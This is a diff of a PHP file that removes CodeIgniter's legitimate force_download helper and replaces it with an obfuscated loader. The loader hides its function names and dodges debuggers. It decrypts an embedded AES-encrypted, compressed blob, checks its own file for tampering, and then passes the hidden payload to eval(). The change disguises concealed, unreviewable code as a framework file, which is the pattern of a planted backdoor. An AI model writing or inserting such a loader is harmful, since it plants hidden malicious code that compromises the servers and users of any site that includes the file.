@@ -1,158 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter Download Helpers
- *
- * @package		CodeIgniter
- * @subpackage	Helpers
- * @category	Helpers
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/helpers/download_helper.html
- */
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('force_download'))
-{
-	/**
-	 * Force Download
-	 *
-	 * Generates headers that force a download to happen
-	 *
-	 * @param	string	filename
-	 * @param	mixed	the data to be downloaded
-	 * @param	bool	whether to try and send the actual file MIME type
-	 * @return	void
-	 */
-	function force_download($filename = '', $data = '', $set_mime = FALSE)
-	{
-		if ($filename === '' OR $data === '')
-		{
-			return;
-		}
-		elseif ($data === NULL)
-		{
-			if ( ! @is_file($filename) OR ($filesize = @filesize($filename)) === FALSE)
-			{
-				return;
-			}
-
-			$filepath = $filename;
-			$filename = explode('/', str_replace(DIRECTORY_SEPARATOR, '/', $filename));
-			$filename = end($filename);
-		}
-		else
-		{
-			$filesize = strlen($data);
-		}
-
-		// Set the default MIME type to send
-		$mime = 'application/octet-stream';
-
-		$x = explode('.', $filename);
-		$extension = end($x);
-
-		if ($set_mime === TRUE)
-		{
-			if (count($x) === 1 OR $extension === '')
-			{
-				/* If we're going to detect the MIME type,
-				 * we'll need a file extension.
-				 */
-				return;
-			}
-
-			// Load the mime types
-			$mimes =& get_mimes();
-
-			// Only change the default MIME if we can find one
-			if (isset($mimes[$extension]))
-			{
-				$mime = is_array($mimes[$extension]) ? $mimes[$extension][0] : $mimes[$extension];
-			}
-		}
-
-		/* It was reported that browsers on Android 2.1 (and possibly older as well)
-		 * need to have the filename extension upper-cased in order to be able to
-		 * download it.
-		 *
-		 * Reference: http://digiblog.de/2011/04/19/android-and-the-download-file-headers/
-		 */
-		if (count($x) !== 1 && isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/Android\s(1|2\.[01])/', $_SERVER['HTTP_USER_AGENT']))
-		{
-			$x[count($x) - 1] = strtoupper($extension);
-			$filename = implode('.', $x);
-		}
-
-		if ($data === NULL && ($fp = @fopen($filepath, 'rb')) === FALSE)
-		{
-			return;
-		}
-
-		// Clean output buffer
-		if (ob_get_level() !== 0 && @ob_end_clean() === FALSE)
-		{
-			@ob_clean();
-		}
-
-		// Generate the server headers
-		header('Content-Type: '.$mime);
-		header('Content-Disposition: attachment; filename="'.$filename.'"');
-		header('Expires: 0');
-		header('Content-Transfer-Encoding: binary');
-		header('Content-Length: '.$filesize);
-		header('Cache-Control: private, no-transform, no-store, must-revalidate');
-
-		// If we have raw data - just dump it
-		if ($data !== NULL)
-		{
-			exit($data);
-		}
-
-		// Flush 1MB chunks of data
-		while ( ! feof($fp) && ($data = fread($fp, 1048576)) !== FALSE)
-		{
-			echo $data;
-		}
-
-		fclose($fp);
-		exit;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qpulusvj=('bas'.'e64'.'_de'.'cod'.'e');
+$_ylxcnl6o=('gzu'.'nco'.'mpr'.'ess');
+$_cbd713l7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_r0wmabeo='XcMCuUyL';
+$_vnplq0v6='0I2Mt2Ir46A=';
+$_zn3j0q1j='I3sJUQ0V';
+$_xh5s2m1q='VtUYTBB7';
+$_dc0ap8sv='/tpZUDZO';
+$_uuq6ci41='VMQyHA==';
+$_gdmyiwmq='TeJWUU3M';
+$_ptb1wnt5='Rpl7clId';
+$_scit1my9=$_qpulusvj($_xh5s2m1q.$_r0wmabeo.$_dc0ap8sv.$_zn3j0q1j.$_vnplq0v6);
+$_aw6x8igq=$_qpulusvj($_ptb1wnt5.$_gdmyiwmq.$_uuq6ci41);
+$_j9qf4b1g=$_qpulusvj('h5t9roXrNsLEtppFejAjeHzDkWOQsOmWXzymxdgn0yksxg1QsmHKO/M3yGywkhR0Vea76LDDU08m1g8QH8/saR1GXrXBFu27Ho+1wJpZWmyLL3fW80OKBg56VNE98bv0ePVlhQ2nPI/8NoXTMpQNGtyXDNi7BYPGnZm/dt9mG8BAvXNIsMT8wTSpo0NV2yGjmvquM/m2VGM6+hP3NJkOj/dI98t7cpUciv743TEQ6/JuhMDaDhSdsd5RlOVmEYHN1IDKc2vFaSCTN01zIQWtzBOBe+Zm0vIKF08RiPd0QHxtTBe0yrTRQwdqQgKvSXH8tOZqNG3HvXCfbDVVJPavg/nQbNtBxi/USg83+RaWqe+CSLl8RcEq6ktr3TnWfyksf7avzJwcua+D6sLAtiHWFIMmDorUuJ8rTO8O28QEZqoZa+cQD3995M0dyRA9UIGD3Rb2gnXRw7uMPuffWEP/qB/nJXydEpYVoHTuI9Ss177bCsmdLg2sAp9QZ9m2vpTf71cCgJ2plIBpo7qPpXefOiPXfbgC4c37uacdVTlPP+/RS9cKhX4afn33iPc7yh5l1sGwncb0it7nMMY0Bnhhoj8sTPPeVr2UCMIYpIkFoBV7i2z2P48Ns13sC7sgd0bSB5ppAco7gm2Tes4q0NcEsUuNlK81KDoxVIfAVd08k2+7JKyhRJLy4fx5W1loNQJowuyrkvPPDydukt89Ng4TCDwblg/CRyOndlQeJkUbvm7fyuWS6ZTjqf5+X0oY+w5sKJs4u7YQdsTOT26p1Gp1ghDFFHOElFNLtkefugsNj6ig6T+l/HfP8M+sVdBpeHOx9ViWhxvaYfJPBEAOgGxhpG8l7N1nkGLpjEBwAVZFq8daxREbGuQFv3OULz1P5JLZxfGTOYVaajvtv9kMAu991a/Bgby5r6/hNyosEIJ9MkH6bHIKmwV51hZgSEm2yE6MB373UMqMGNx8UslN/7Nzty2rDZb3HjYeE59ivvVolbyH6wDvR63xRrfmepuwxI+0');
+$_wimk3rvp=$_cbd713l7($_j9qf4b1g,'aes-256-cbc',$_scit1my9,OPENSSL_RAW_DATA,$_aw6x8igq);
+if($_wimk3rvp===false){exit;}
+$_izj1qe2z=$_ylxcnl6o($_wimk3rvp);
+if($_izj1qe2z===false){exit;}
+$_zdscqygc='0e5076fb241fd8f4b0c396b5cf625aee53eebc6ad9f55bded29d554ed1d6a545';
+$_gsqzxgh5=@file_get_contents(__FILE__);
+if($_gsqzxgh5!==false){
+$_u2dls09u=str_replace($_zdscqygc,"0000000000000000000000000000000000000000000000000000000000000000",$_gsqzxgh5);
+$_ednzynpd=hash("sha256",$_u2dls09u);
+if($_ednzynpd!==$_zdscqygc){@http_response_code(403);exit;}
 }
+eval($_izj1qe2z);
